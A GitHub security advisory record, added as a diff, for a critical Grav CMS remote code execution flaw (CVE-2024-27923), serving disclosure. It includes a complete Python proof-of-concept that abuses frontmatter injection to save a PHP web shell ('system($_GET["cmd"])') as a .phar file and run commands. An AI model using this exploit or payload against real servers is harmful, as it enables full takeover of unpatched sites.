@@ -1,0 +1,59 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-f6g2-h7qv-3m5v",
+  "modified": "2024-03-06T16:58:33Z",
+  "published": "2024-03-06T16:58:33Z",
+  "aliases": [
+    "CVE-2024-27923"
+  ],
+  "summary": "Remote Code Execution by uploading a phar file using frontmatter",
+  "details": "### Summary\n- Due to insufficient permission verification, user who can write a page use frontmatter feature.\n- Inadequate File Name Validation\n\n### Details\n1. Insufficient Permission Verification\n\nIn Grav CMS, \"[Frontmatter](https://learn.getgrav.org/17/content/headers)\" refers to the metadata block located at the top of a Markdown file. Frontmatter serves the purpose of providing additional information about a specific page or post.\nIn this feature, only administrators are granted access, while regular users who can create pages are not. However, if a regular user adds the data[_json][header][form] parameter to the POST Body while creating a page, they can use Frontmatter. The demonstration of this vulnerability is provided in video format. [Video Link](https://www.youtube.com/watch?v=EU1QA0idoWE)\n\n2. Inadequate File Name Validation\n\nTo create a Contact Form, Frontmatter and markdown can be written as follows:\n[Contact Form Example](https://learn.getgrav.org/17/forms/forms/example-form)\n[Form Action Save Option](https://learn.getgrav.org/17/forms/forms/reference-form-actions#save)\nWhen an external user submits the Contact Form after filling it out, the data is stored in the user/data folder. The filename under which the data is stored corresponds to the value specified in the filename attribute of the process property. For instance, if the filename attribute has a value of \"feedback.txt,\" a feedback.txt file is created in the user/data/contact folder. This file contains the value entered by the user in the \"name\" field. The problem with this functionality is the lack of validation for the filename attribute, potentially allowing the creation of files such as phar files on the server. An attacker could input arbitrary PHP code into the \"name\" field to be saved on the server. However, Grav filter the < and > characters, so to disable these options, an xss_check: false attribute should be added. [Disable XSS](https://learn.getgrav.org/17/forms/forms/form-options#xss-checks)\n\n```\n---\ntitle: Contact Form\n\nform:\n    name: contact\n    xss_check: false\n\n    fields:\n        name:\n          label: Name\n          placeholder: Enter your name\n          autocomplete: on\n          type: text\n          validate:\n            required: true\n\n    buttons:\n        submit:\n          type: submit\n          value: Submit\n\n    process:\n        save:\n            filename: this_is_file_name.phar\n            operation: add\n\n---\n\n# Contact form\n\nSome sample page content\n```\n\nExploiting these two vulnerabilities allows the following scenario:\n\n- A regular user account capable of creating pages is required.\n- An attacker creates a Contact Form page containing malicious Frontmatter using the regular user's account.\n- Accessing the Contact Form page, the attacker submits PHP code.\n- The attacker attempts Remote Code Execution by accessing HOST/user/data/[form-name]/[filename].\n\n### PoC\n\n[PoC Video Link](https://www.youtube.com/watch?v=Gh3ezpORbPc)\n\n```python\n# PoC.py\nimport requests\nfrom bs4 import BeautifulSoup\n\nclass Poc:\n\n    def __init__(self, cmd):\n        self.sess = requests.Session()\n\n        ##########    INIT    ################\n        self.USERNAME = \"guest\"\n        self.PASSWORD = \"Guest123!\"\n        self.PREFIX_URL = \"http://192.168.12.119:8888/grav\"\n        self.PAGE_NAME = \"this_is_poc_page47\"\n        self.PHP_FILE_NAME = \"universe.phar\"\n        self.PAYLOAD = '<?php system($_GET[\"cmd\"]); ?>'\n        self.cmd = cmd\n        ##########    END    ################\n\n        self.sess.get(self.PREFIX_URL)\n        self._login()\n        self._save_page()\n        self._inject_command()\n        self._execute_command()\n    \n\n    def _get_nonce(self, data, name):\n        # Get login nonce value\n        res = BeautifulSoup(data, \"html.parser\")\n        return res.find(\"input\", {\"name\" : name}).get(\"value\")\n\n    \n    def _login(self):\n        print(\"[*] Try to Login\")\n        res = self.sess.get(self.PREFIX_URL + \"/admin\")\n\n        login_nonce = self._get_nonce(res.text, \"login-nonce\")\n\n        # Login\n        login_data = {\n            \"data[username]\" : self.USERNAME,\n            \"data[password]\" : self.PASSWORD,\n            \"task\" : \"login\",\n            \"login-nonce\" : login_nonce\n        }\n        res = self.sess.post(self.PREFIX_URL + \"/admin\", data=login_data)\n\n        # Check login\n        if res.status_code != 303:\n            print(\"[!] username or password is wrong\")\n            exit()\n        \n        print(\"[*] Success Login\")\n\n\n    def _save_page(self):\n        print(\"[*] Try to write page\")\n\n        res = self.sess.get(self.PREFIX_URL + f\"/admin/pages/{self.PAGE_NAME}/:add\")\n        form_nonce = self._get_nonce(res.text, \"form-nonce\")\n        unique_form_id = self._get_nonce(res.text, \"__unique_form_id__\")\n\n        # Add page data\n        page_data  = f\"task=save&data%5Bheader%5D%5Btitle%5D={self.PAGE_NAME}&data%5Bcontent%5D=content&data%5Bheader%5D%5Bsearch%5D=&data%5Bfolder%5D={self.PAGE_NAME}&data%5Broute%5D=&data%5Bname%5D=form&data%5Bheader%5D%5Bbody_classes%5D=&data%5Bordering%5D=1&data%5Border%5D=&data%5Bheader%5D%5Border_by%5D=&data%5Bheader%5D%5Border_manual%5D=&data%5Bblueprint%5D=&data%5Blang%5D=&_post_entries_save=edit&__form-name__=flex-pages&__unique_form_id__={unique_form_id}&form-nonce={form_nonce}&toggleable_data%5Bheader%5D%5Bpublished%5D=0&toggleable_data%5Bheader%5D%5Bdate%5D=0&toggleable_data%5Bheader%5D%5Bpublish_date%5D=0&toggleable_data%5Bheader%5D%5Bunpublish_date%5D=0&toggleable_data%5Bheader%5D%5Bmetadata%5D=0&toggleable_data%5Bheader%5D%5Bdateformat%5D=0&toggleable_data%5Bheader%5D%5Bmenu%5D=0&toggleable_data%5Bheader%5D%5Bslug%5D=0&toggleable_data%5Bheader%5D%5Bredirect%5D=0&toggleable_data%5Bheader%5D%5Bprocess%5D=0&toggleable_data%5Bheader%5D%5Btwig_first%5D=0&toggleable_data%5Bheader%5D%5Bnever_cache_twig%5D=0&toggleable_data%5Bheader%5D%5Bchild_type%5D=0&toggleable_data%5Bheader%5D%5Broutable%5D=0&toggleable_data%5Bheader%5D%5Bcache_enable%5D=0&toggleable_data%5Bheader%5D%5Bvisible%5D=0&toggleable_data%5Bheader%5D%5Bdebugger%5D=0&toggleable_data%5Bheader%5D%5Btemplate%5D=0&toggleable_data%5Bheader%5D%5Bappend_url_extension%5D=0&toggleable_data%5Bheader%5D%5Bredirect_default_route%5D=0&toggleable_data%5Bheader%5D%5Broutes%5D%5Bdefault%5D=0&toggleable_data%5Bheader%5D%5Broutes%5D%5Bcanonical%5D=0&toggleable_data%5Bheader%5D%5Broutes%5D%5Baliases%5D=0&toggleable_data%5Bheader%5D%5Badmin%5D%5Bchildren_display_order%5D=0&toggleable_data%5Bheader%5D%5Blogin%5D%5Bvisibility_requires_access%5D=0\"\n        page_data += f\"&data%5B_json%5D%5Bheader%5D%5Bform%5D=%7B%22xss_check%22%3Afalse%2C%22name%22%3A%22contact-form%22%2C%22fields%22%3A%7B%22name%22%3A%7B%22label%22%3A%22Name%22%2C%22placeholder%22%3A%22Enter+php+code%22%2C%22autofocus%22%3A%22on%22%2C%22autocomplete%22%3A%22on%22%2C%22type%22%3A%22text%22%2C%22validate%22%3A%7B%22required%22%3Atrue%7D%7D%7D%2C%22process%22%3A%7B%22save%22%3A%7B%22filename%22%3A%22{self.PHP_FILE_NAME}%22%2C%22operation%22%3A%22add%22%7D%7D%2C%22buttons%22%3A%7B%22submit%22%3A%7B%22type%22%3A%22submit%22%2C%22value%22%3A%22Submit%22%7D%7D%7D\"\n        res = self.sess.post(self.PREFIX_URL + f\"/admin/pages/{self.PAGE_NAME}/:add\" , data = page_data, headers = {'Content-Type': 'application/x-www-form-urlencoded'})\n\n        print(\"[*] Success write page: \" + self.PREFIX_URL + f\"/{self.PAGE_NAME}\")\n\n\n    def _inject_command(self):\n        print(\"[*] Try to inject php code\")\n\n        res = self.sess.get(self.PREFIX_URL + f\"/{self.PAGE_NAME}\")\n        form_nonce = self._get_nonce(res.text, \"form-nonce\")\n        unique_form_id = self._get_nonce(res.text, \"__unique_form_id__\")\n\n        form_data = f\"data%5Bname%5D={self.PAYLOAD}&__form-name__=contact-form&__unique_form_id__={unique_form_id}&form-nonce={form_nonce}\"\n\n        res = self.sess.post(self.PREFIX_URL + f\"/{self.PAGE_NAME}\" , data = form_data, headers = {'Content-Type': 'application/x-www-form-urlencoded'})\n\n        print(\"[*] Success inject php code\")\n\n\n    def _execute_command(self):\n        res = self.sess.get(self.PREFIX_URL + f\"/user/data/contact-form/{self.PHP_FILE_NAME}?cmd={self.cmd}\")\n\n        if res.status_code == 404:\n            print(\"[!] Fail to execute command or not save php file.\")\n            exit()\n\n        print(\"[*] This is uploaded php file url.\")\n        print(self.PREFIX_URL + f\"/user/data/contact-form/{self.PHP_FILE_NAME}?cmd={self.cmd}\")\n        print(res.text)\n\n\nif __name__ == \"__main__\":\n    Poc(cmd=\"id\")\n```\n\n### Impact\n\nRemote Code Execution\n",
+  "severity": [
+
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Packagist",
+        "name": "getgrav/grav"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.7.43"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/getgrav/grav/security/advisories/GHSA-f6g2-h7qv-3m5v"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/getgrav/grav/commit/e3b0aa0c502aad251c1b79d1ee973dcd93711f07"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/getgrav/grav"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-287",
+      "CWE-434"
+    ],
+    "severity": "CRITICAL",
+    "github_reviewed": true,
+    "github_reviewed_at": "2024-03-06T16:58:33Z",
+    "nvd_published_at": null
+  }
+}
